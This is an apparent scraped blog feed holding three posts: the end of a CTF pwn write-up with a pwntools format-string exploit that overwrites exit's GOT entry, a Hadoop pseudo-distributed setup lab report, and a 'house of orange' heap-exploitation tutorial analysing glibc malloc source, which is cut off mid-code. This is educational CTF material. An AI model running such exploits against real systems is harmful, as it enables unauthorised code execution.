<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28072)</span></span><br><span class="line">p = process(<span class="string">&quot;Voting_Machine_2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;Voting_Machine_2&quot;</span>)</span><br><span class="line"></span><br><span class="line">exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;AA&#x27;</span> + fmtstr_payload(<span class="number">8</span>,&#123;exit_got:<span class="number">0x8420736</span>&#125;,numbwritten=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x84208D9&#x27;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<!--
CTF记账 
2021-11-07 实验室桶装水-39 剩余961
2021-11-14 实验室桶装水-26 剩余935
2021-12-14 WDLJT报销-714  剩余221
2022-01-27 实验室桶装水-78 剩余143
-->]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>伪分布式环境搭建实验报告</title>
    <url>/2021/10/18/hadoop/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/21.jpg" alt="pic"></p>
<span id="more"></span>
<h3 id="step1-虚拟机安装与操作"><a class="header-anchor" href="#step1-虚拟机安装与操作">¶</a>step1 虚拟机安装与操作</h3>
<p><img src="http://static.zybuluo.com/hgggg/8v2nqbfn8jkcxx5conjhlkxx/5.png" alt="5.png-18.4kB"><br>
新建虚拟机选择ubbuntu16镜像，然后一直下一步即可<br>
<img src="http://static.zybuluo.com/hgggg/wu3uhxlmekqyrizfqky30ur3/6.png" alt="6.png-39.1kB"></p>
<p>由于之前安装了VMtools，所以接下来直接将hadoop和jdk的压缩包复制粘贴进虚拟机<br>
<img src="http://static.zybuluo.com/hgggg/hkm8rlfla9qgosphhb999mo0/7.png" alt="7.png-32.5kB"></p>
<h3 id="step2-环境搭建"><a class="header-anchor" href="#step2-环境搭建">¶</a>step2 环境搭建</h3>
<h4 id="java环境配置"><a class="header-anchor" href="#java环境配置">¶</a>java环境配置</h4>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo mkdir /usr/java</span><br><span class="line">sudo tar -zxvf jdk-8u221-linux-x64.tar.gz -C /usr/java/</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>在最后一行加上<br>
<img src="http://static.zybuluo.com/hgggg/zg3bhvxnuj0wwe80kcnbv0x2/8.png" alt="8.png-12.7kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure>
<p>在最后一行加上<br>
<img src="http://static.zybuluo.com/hgggg/bh49xexp4kdug5r819ab8lyf/9.png" alt="9.png-15.8kB"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/environment</span><br></pre></td></tr></table></figure>
<p>在最后一行加上<br>
<img src="http://static.zybuluo.com/hgggg/zw5n598yswt03dw0fg3hzk1u/10.png" alt="10.png-10.4kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/environment</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/lp4dc2f7lxtop63hqyevdg13/11.png" alt="11.png-14.5kB"></p>
<h4 id="ssh-server配置"><a class="header-anchor" href="#ssh-server配置">¶</a>ssh-server配置</h4>
<p>安装并启动ssh-server</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br><span class="line">sudo /etc/init.d/ssh start</span><br></pre></td></tr></table></figure>
<p>生成RSA</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>关闭防火墙</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
<p>链接测试<br>
<img src="http://static.zybuluo.com/hgggg/vbqf9nt6wvop920d6ihu69q2/12.png" alt="12.png-32.6kB"></p>
<h4 id="安装hadoop"><a class="header-anchor" href="#安装hadoop">¶</a>安装hadoop</h4>
<p>解压</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo tar zxvf hadoop-2.7.4.tar.gz -C /usr/<span class="built_in">local</span></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span></span><br><span class="line">sudo mv hadoop-2.7.4 hadoop </span><br><span class="line">sudo chmod 777 -R /usr/<span class="built_in">local</span>/hadoop</span><br></pre></td></tr></table></figure>
<p>配置</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>在最后加上<br>
<img src="http://static.zybuluo.com/hgggg/uwjocl7bhzecsqmdevsy64pr/13.png" alt="13.png-36.4kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/hadoop-env.sh</span><br></pre></td></tr></table></figure>
<p>在最后加上<br>
<img src="http://static.zybuluo.com/hgggg/j0s4jddn51fvz0k4lrs068qa/14.png" alt="14.png-9.7kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/yarn-env.sh</span><br></pre></td></tr></table></figure>
<p>在最后加上<br>
<img src="http://static.zybuluo.com/hgggg/e6quobwwxiaobhmttaxi3j6c/15.png" alt="15.png-9.4kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/core-site.xml</span><br></pre></td></tr></table></figure>
<p>在configuration标签中加入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">description</span>&gt;</span>Abase for other temporary directories.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/hdfs-site.xml</span><br></pre></td></tr></table></figure>
<p>在configuration标签中加入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/yarn-site.xml </span><br></pre></td></tr></table></figure>
<p>在configuration标签中加入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- Site specific YARN configuration properties --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services.mapreduce.shuffle.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.mapred.ShuffleHandler<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>127.0.0.1:8032<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>127.0.0.1:8030<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>127.0.0.1:8031<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>重启后输入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop version</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/zxvawc5xy43rovhkvrx8pfdh/16.png" alt="16.png-34.8kB"></p>
<p>启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hdfs namenode -format</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/hadoop/sbin</span><br><span class="line">start-all.sh</span><br></pre></td></tr></table></figure>
<p>访问本地的8088，和50070端口<br>
<img src="http://static.zybuluo.com/hgggg/l1bzsn3ye3uw1tirknb77a5f/17.png" alt="17.png-119.7kB"><br>
<img src="http://static.zybuluo.com/hgggg/5qeojvvshsss60h0as574hxz/18.png" alt="18.png-125.6kB"></p>
<h3 id="Step3-平台操作"><a class="header-anchor" href="#Step3-平台操作">¶</a>Step3 平台操作</h3>
<p>新建目录</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop fs -mkdir /tmp/input</span><br></pre></td></tr></table></figure>
<p>上传本地文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop fs -put exp.py /tmp/input</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/d3viipvnn25ye9im21h3ljoc/19.png" alt="19.png-68kB"><br>
查看</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop fs -cat /tmp/input/exp.py</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/u2c9qffjgyb2pmu9276fdd79/20.png" alt="20.png-42.2kB"></p>
<h3 id="参考"><a class="header-anchor" href="#参考">¶</a>参考</h3>
<p><a href="https://blog.csdn.net/kh896424665/article/details/78765175">https://blog.csdn.net/kh896424665/article/details/78765175</a><br>
<a href="https://www.cnblogs.com/biehongli/p/7026809.html">https://www.cnblogs.com/biehongli/p/7026809.html</a></p>
]]></content>
      <categories>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>house of orange</title>
    <url>/2021/10/04/house-of-orange/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/22.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><pre><code>无free函数的堆溢出：没有free函数，或者是无法调用free函数free指定的堆块
</code></pre><h2 id="malloc-top-chunk-源码分析"><a href="#malloc-top-chunk-源码分析" class="headerlink" title="malloc top chunk 源码分析"></a>malloc top chunk 源码分析</h2><p><img src="http://static.zybuluo.com/hgggg/l40dvsvhi9dxg2pbicbn4yiz/9.png" alt="9.png-18.8kB"><br>如图所示，当我们可以从heap处溢出的时候，就可以覆盖top chunk的size和p_size（上面这张图画的时候画错了P打成D了）</p>
<p>接下来来看top chunk的源码<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>当用户申请的chunk size小于top chunk size时，会从top chunk中分割一部分给用户使用</p>
<p>而当用户申请的chunk size大于top chunk size时，则会去调用sysmalloc</p>
<p>来看下syscall </p>
<p>如果arena为空或者需要分配的内存大小大于使用mmap进行分配的阀值mp_.mmap_threshold且mp_.n_mmaps判断系统还可以有可以使用mmap分配的空间，就会去调用mmap来分配内存<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">         <span class="comment">/* 省略 */</span></span><br></pre></td></tr></table></figure><br>接下来会对top chunk进行检查<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;      <span class="comment">/* top chunk 的指针 */</span></span><br><span class="line">old_size = chunksize (old_top);   <span class="comment">/* top chunk 的大小 */</span></span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">/* top chunk 的尾部地址 */</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这之后会对top chunk 进行扩展,当arena == main arena时会先调用grow_heap来扩展，若扩展失败，则会进入eles路线，最终触发 _int_free (av, old_top, 1)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">    heap_info *old_heap, *heap;</span><br><span class="line">    <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">    old_heap = heap_for_ptr (old_top);</span><br><span class="line">    old_heap_size = old_heap-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">        &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        set_head (old_top, (((<span class="keyword">char</span> *) old_heap + old_heap-&gt;size) - (<span class="keyword">char</span> *) old_top)</span><br><span class="line">                  | PREV_INUSE);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">      &#123;</span><br><span class="line">          ......</span><br><span class="line">        <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">            set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">            _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><br>同理，当arena != main_arena 时也会触发  _int_free (av, old_top, 1)<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (snd_brk != (char *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">    av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">       If not the first time through, we either have a</span><br><span class="line">       gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="line">       double fencepost at old_top to prevent consolidation with space</span><br><span class="line">       we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="line">       marked as inuse and are in any case too small to use.  We need</span><br><span class="line">       two to make sizes and alignments work out.</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    if (old_size != 0)</span><br><span class="line">      &#123;</span><br><span class="line">        /*</span><br><span class="line">           Shrink old_top to insert fenceposts, keeping size a</span><br><span class="line">           multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="line">           enough space in old_top to do this.</span><br><span class="line">         */</span><br><span class="line">        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">        set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">           Note that the following assignments completely overwrite</span><br><span class="line">           old_top when old_size was previously MINSIZE.  This is</span><br><span class="line">           intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="line">           lost.</span><br><span class="line">         */</span><br><span class="line">        chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        /* If possible, release the rest. */</span><br><span class="line">        if (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            _int_free (av, old_top, 1);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><br>画个简单的流程图来总结一下</p>
<p><img src="http://static.zybuluo.com/hgggg/o5w1swm10mrscnnqtes1l2bo/10.png" alt="10.png-53.6kB"><br><strong>综上所述 ， 当我们控制top chunk的大小为unsorted bin的大小时，就可以unsorted bin attact</strong></p>
<h2 id="malloc-printerr-源码分析"><a href="#malloc-printerr-源码分析" class="headerlink" title="malloc_printerr 源码分析"></a>malloc_printerr 源码分析</h2><p>malloc_printerr是malloc中用于提示错误的函数，该函数最终会调用<strong>libc_message<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>跟进</strong>libc_message,最终会调用abort()来切断进程<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_abort)</span><br><span class="line">  &#123;</span><br><span class="line">    BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Kill the application.  */</span></span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>继续跟进,abrot里面会调用fflush<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (stage == 1)</span><br><span class="line">  &#123;</span><br><span class="line">    ++stage;</span><br><span class="line">    fflush (NULL);</span><br><span class="line">  &#125;c</span><br></pre></td></tr></table></figure><br>可以得到一条调用链<br>_IO_fflush -&gt; _IO_flush_all -&gt; _IO_flush_all_lockp</p>
<p>_IO_flush_all_lockp从_IO_list_all作为链表头进行遍历，以当前节点作为 _IO_OVERFLOW的参数<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span 